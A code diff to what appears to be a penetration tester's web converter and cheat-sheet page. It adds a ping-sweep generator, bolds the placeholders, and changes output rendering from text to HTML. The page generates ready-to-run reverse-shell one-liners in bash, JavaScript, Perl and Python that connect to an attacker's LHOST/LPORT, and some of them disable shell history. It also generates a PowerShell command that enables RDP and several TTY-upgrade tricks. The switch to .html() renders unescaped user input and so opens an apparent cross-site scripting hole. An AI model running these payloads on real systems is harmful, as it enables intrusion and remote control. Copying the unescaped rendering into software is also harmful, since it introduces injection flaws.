@@ -294,6 +294,7 @@ if (language) {
   <option value="Base64 encoding">
   <option value="Base64 decoding">
   <option value="Bash TCP reverse shell">
+  <option value="Bash: Ping sweep">
   <option value="Binary encoding">
   <option value="Binary decoding">
   <option value="Brainfuck interpreter">
@@ -334,7 +335,8 @@ $(function () {
   var functions = {};
   functions["Base64 encoding"] = function (input) { return btoa(input); }
   functions["Base64 decoding"] = function (input) { return atob(input); }
-  functions["Bash TCP reverse shell"] = function (input) { return apply_2args("bash -i >& /dev/tcp/LHOST/LPORT 0>&1", "LHOST", "LPORT", input); }
+  functions["Bash TCP reverse shell"] = function (input) { return apply_2args("bash -i >& /dev/tcp/<b>LHOST</b>/<b>LPORT</b> 0>&1", "LHOST", "LPORT", input); }
+  functions["Bash: Ping sweep"] = function (input) { return apply_arg("for i in `seq 1 255`; do ping -c 1 -W 1 <b>192.168.1</b>.$i | grep 'from'; done", "192.168.1", input); }
   functions["Binary encoding"] = function (input) { output = ""; for (i = 0; i < input.length; i++) { var e = input[i].charCodeAt(0); var s = ""; do { var a = e % 2; e = (e-a)/2; s = a+s; } while(e != 0); while(s.length < 8) { s = "0" + s;} output += s; } return output; }
   functions["Binary decoding"] = function (input) { return input.replace(/[01]{8}/g, function(v){ 
   return String.fromCharCode(parseInt(v, 2)); }); }
@@ -344,18 +346,18 @@ $(function () {
   functions["Decimal ASCII encoding"] = function (input) { function ascii_enc (a) { return a.charCodeAt(0); } return input.split('').map(ascii_enc); }
   functions["Decimal ASCII decoding"] = function (input) { function ascii_dec (a) { return String.fromCharCode(a); } return input.split(',').map(ascii_dec).join(''); }
   functions["IPv4 to decimal (int32)"] = function (input) { var b32 = ''; input.split('.').map((value) => { b32 += ((+value).toString(2)).padStart(8,'0'); }); return parseInt(b32,2); } 
-  functions["Javascript TCP reverse shell"] = function (input) { return apply_2args('(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(LPORT, "LHOST", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();', "LHOST", "LPORT", input); }
+  functions["Javascript TCP reverse shell"] = function (input) { return apply_2args('(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(<b>LPORT</b>, "<b>LHOST</b>", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();', "LHOST", "LPORT", input); }
   functions["Morse code encoding"] = function (input) { return MorseCode.encode(input); }
   functions["Morse code decoding"] = function (input) { return MorseCode.decode(input); }
-  functions["Perl TCP reverse shell"] = function (input) { return apply_2args('perl -e \x27use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\x27', "LHOST", "LPORT", input); }
+  functions["Perl TCP reverse shell"] = function (input) { return apply_2args('perl -e \x27use Socket;$i="<b>LHOST</b>";$p=<b>LPORT</b>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\x27', "LHOST", "LPORT", input); }
   functions["Powershell: Enable RDP access"] = function (input) { return 'Set-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server" -Name "fDenyTSConnections" -Value 0; Enable-NetFirewallRule -DisplayGroup "Remote Desktop";'; }
-  functions["Powershell: Base64 to file"] = function (input) { return apply_2args("[IO.File]::WriteAllBytes($filename, [Convert]::FromBase64String($base64string));", "$filename", "$base64string", "'"+input.split(":").join("':'")+"'"); }
-  functions["Powershell: File to base64"] = function (input) { return apply_arg("[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename));", "$filename", "'"+input+"'"); }
-  functions["Python STCP reverse shell"] = function (input) { return apply_2args('python -c "import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect((\x27LHOST\x27,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\x27HISTFILE\x27,\x27/dev/null\x27);pty.spawn([\x27/bin/bash\x27,\x27-i\x27]);s.close();exit();"', "LHOST", "LPORT", input); }
-  functions["Python TCP reverse shell"] = function (input) { return apply_2args('python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\x27LHOST\x27,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\x27HISTFILE\x27,\x27/dev/null\x27);pty.spawn([\x27/bin/bash\x27,\x27-i\x27]);s.close();exit();"', "LHOST", "LPORT", input); }
-  functions["Python UDP reverse shell"] = function (input) { return apply_2args('python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\x27LHOST\x27,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\x27HISTFILE\x27,\x27/dev/null\x27);pty.spawn([\x27/bin/bash\x27,\x27-i\x27]);s.close();"', "LHOST", "LPORT", input); }
+  functions["Powershell: Base64 to file"] = function (input) { return apply_2args("[IO.File]::WriteAllBytes(<b>$filename</b>, [Convert]::FromBase64String(<b>$base64string</b>));", "$filename", "$base64string", "'"+input.split(":").join("':'")+"'"); }
+  functions["Powershell: File to base64"] = function (input) { return apply_arg("[Convert]::ToBase64String([IO.File]::ReadAllBytes(<b>$filename</b>));", "$filename", "'"+input+"'"); }
+  functions["Python STCP reverse shell"] = function (input) { return apply_2args('python -c "import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect((\x27<b>LHOST</b>\x27,<b>LPORT</b>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\x27HISTFILE\x27,\x27/dev/null\x27);pty.spawn([\x27/bin/bash\x27,\x27-i\x27]);s.close();exit();"', "LHOST", "LPORT", input); }
+  functions["Python TCP reverse shell"] = function (input) { return apply_2args('python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\x27<b>LHOST</b>\x27,<b>LPORT</b>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\x27HISTFILE\x27,\x27/dev/null\x27);pty.spawn([\x27/bin/bash\x27,\x27-i\x27]);s.close();exit();"', "LHOST", "LPORT", input); }
+  functions["Python UDP reverse shell"] = function (input) { return apply_2args('python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\x27<b>LHOST</b>\x27,<b>LPORT</b>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\x27HISTFILE\x27,\x27/dev/null\x27);pty.spawn([\x27/bin/bash\x27,\x27-i\x27]);s.close();"', "LHOST", "LPORT", input); }
   functions["TTY (pty) python trick"] = function (input) { return 'python -c "import pty;pty.spawn(\x27/bin/sh\x27)";' }
-  functions["TTY script trick"] = function (input) { return apply_arg("script --return -c 'command' /dev/null", "command", input); }
+  functions["TTY script trick"] = function (input) { return apply_arg("script --return -c '<b>command</b>' /dev/null", "command", input); }
   functions["UTF-8 hex encoding"] = function (input) { return unescape(encodeURIComponent(input)).split('').map(function(v){ return v.charCodeAt(0).toString(16); }).join(''); }
   functions["UTF-8 hex decoding"] = function (input) { return decodeURIComponent(input.replace(/(..)/g,'%$1')); }
   functions["URL encoding (minimum)"] = function (input) { return encodeURI(input); }
@@ -376,7 +378,7 @@ $(function () {
       $("#result").css("background-color", "red");
     }
     if (result) {
-      $("#result").text(result); $("#result").css("display", "table");
+      $("#result").html(result); $("#result").css("display", "table");
     } else {
       $("#result").css("display", "none");
     }
